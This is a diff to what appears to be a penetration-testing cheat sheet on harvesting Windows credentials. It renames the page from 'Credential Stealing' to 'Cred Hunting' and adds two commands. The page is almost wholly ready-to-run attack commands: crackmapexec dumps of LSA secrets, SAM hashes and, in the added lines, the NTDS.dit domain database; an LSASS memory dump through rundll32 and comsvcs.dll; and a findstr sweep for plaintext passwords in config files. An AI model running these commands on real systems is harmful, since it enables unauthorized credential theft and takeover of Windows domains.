@@ -1,4 +1,4 @@
-# Credential Stealing
+# Cred Hunting
 
 ## Copying SAM Registry Hives
 
@@ -39,6 +39,12 @@ crackmapexec smb 13.13.13.13 --local-auth -u amogus -p 1mp0st3r --lsa
 crackmapexec smb 13.13.13.13 --local-auth -u amogus -p 1mp0st3r --sam
 ```
 
+### Dumping  NTDS.dit Remotely
+
+```bash
+crackmapexec smb 13.13.13.13 -u amogus -p 1mp0st3r --ntds
+```
+
 ## LSASS Dumping
 
 **Rundll32.exe & Comsvcs.dll Method**
@@ -47,4 +53,10 @@ crackmapexec smb 13.13.13.13 --local-auth -u amogus -p 1mp0st3r --sam
 
 ```powershell
 PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 666 C:\lsass.dmp full
+```
+
+## Finding credentials with findstr
+
+```powershell
+C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
 ```
